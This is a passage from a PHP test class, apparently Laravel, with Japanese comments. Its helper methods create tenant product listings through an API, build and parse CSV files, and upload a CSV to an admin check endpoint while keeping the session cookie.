        $listing = $this->send('POST', "/api/tenants/{$tenant}/listings", ['seller_id' => $sellerId, 'kind' => 'product'] + $fields)->assertCreated()->json('listing');
        $this->assertIsArray($listing);

        return $listing;
    }

    /**
     * 見出しの全部の列を持つ CSV（書かなかった欄は空）
     *
     * @param  list<array<string, string>>  $rows
     */
    private function csv(array $rows): string
    {
        $headers = explode(',', self::HEADER);
        $stream = fopen('php://temp', 'r+b');
        $this->assertIsResource($stream);
        fputcsv($stream, $headers, escape: '', eol: "\r\n");

        foreach ($rows as $row) {
            fputcsv($stream, array_map(static fn (string $h): string => $row[$h] ?? '', $headers), escape: '', eol: "\r\n");
        }

        rewind($stream);
        $csv = (string) stream_get_contents($stream);
        fclose($stream);

        return $csv;
    }

    /**
     * @return list<array<string, string>>
     */
    private function parse(string $csv): array
    {
        $stream = fopen('php://temp', 'r+b');
        $this->assertIsResource($stream);
        fwrite($stream, substr($csv, 3));
        rewind($stream);
        $headers = fgetcsv($stream, escape: '');
        $this->assertIsArray($headers);
        $rows = [];

        while (($cells = fgetcsv($stream, escape: '')) !== false) {
            $rows[] = array_combine(array_map('strval', $headers), array_map('strval', $cells));
        }

        fclose($stream);

        return $rows;
    }

    /**
     * CSV を上げて確かめを始める（テストのキューは sync なので、答えの時には確かめが済んでいる）
     *
     * @return TestResponse<Response>
     */
    private function upload(string $tenant, string $bytes): TestResponse
    {
        $path = (string) tempnam(sys_get_temp_dir(), 'csv');
        file_put_contents($path, $bytes);
        $this->files[] = $path;
        $cookie = (string) config('admin.session_cookie');

        if ($this->sessionId !== null) {
            $this->withCookie($cookie, $this->sessionId);
        }

        $response = $this->withHeader('Accept', 'application/json')
            ->post("{$this->adminHost}/api/tenants/{$tenant}/listings-csv/check", ['file' => new UploadedFile($path, 'products.csv', 'text/csv', null, true)]);
        $next = $response->getCookie($cookie);

        if ($next !== null) {
            $this->sessionId = $next->getValue();
        }

        return $response;
    }
}
